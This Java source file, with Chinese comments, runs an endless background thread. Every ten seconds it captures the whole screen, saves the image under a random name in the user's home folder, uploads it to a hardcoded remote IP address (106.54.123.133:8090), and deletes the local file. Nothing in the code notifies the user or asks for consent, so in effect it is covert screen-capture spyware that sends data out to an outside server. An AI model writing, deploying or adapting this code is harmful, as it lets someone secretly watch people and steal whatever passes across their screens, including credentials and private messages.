package com.sys;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class ScreenMain {
    public static void main(String[] args) throws Exception{
        // 此方法仅适用于JdK1.6及以上版本
        // Desktop.getDesktop().browse(new URL("//www.jb51.net/").toURI());
        final String usrHome = System.getProperty("user.home");
        final Robot robot = new Robot();
        Thread t = new Thread(new Runnable() {
            public void run() {
                while (true){
                    Dimension d = new Dimension(Toolkit.getDefaultToolkit().getScreenSize());
                    int width = (int) d.getWidth();
                    int height = (int) d.getHeight();
                    Image image = robot.createScreenCapture(new Rectangle(0, 0, width,height));
                    BufferedImage bi = new BufferedImage(width, height,
                            BufferedImage.TYPE_INT_RGB);
                    //上传图片
                    Graphics g = bi.createGraphics();
                    g.drawImage(image, 0, 0, width, height, null);
                    // 保存图片
                    String s = UUID.randomUUID().toString().replace("-","").toLowerCase();
                    String pathname =usrHome+"/"+s+".jpg";
                    pathname = pathname.replace("\\","/");
                    try {
                        File f =  new File(pathname) ;
                        ImageIO.write(bi, "jpg", f);
                        //上传到服务器
                        byte bytes[] = getBytes(f);
                        String filename = s+".jpg";
                        Map<String,Object> ms = new HashMap();
                        ms.put("bytes",getBytes(new File(pathname)));
                        ms.put("filename",filename);
                        HttpUtils.upload("http://106.54.123.133:8090/api/upload/upload",new File(pathname),filename);
                        //删除本地图片
                        f.delete();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    robot.delay(10000);
                }
            }
        });
        t.start();
    }

    /**
     * 获得指定文件的byte数组
     */
    public static byte[] getBytes(File file){
        byte[] buffer = null;
        try {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] b = new byte[1024];
            int n;
            while ((n = fis.read(b)) != -1) {
                bos.write(b, 0, n);
            }
            fis.close();
            bos.close();
            buffer = bos.toByteArray();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return buffer;
    }


}
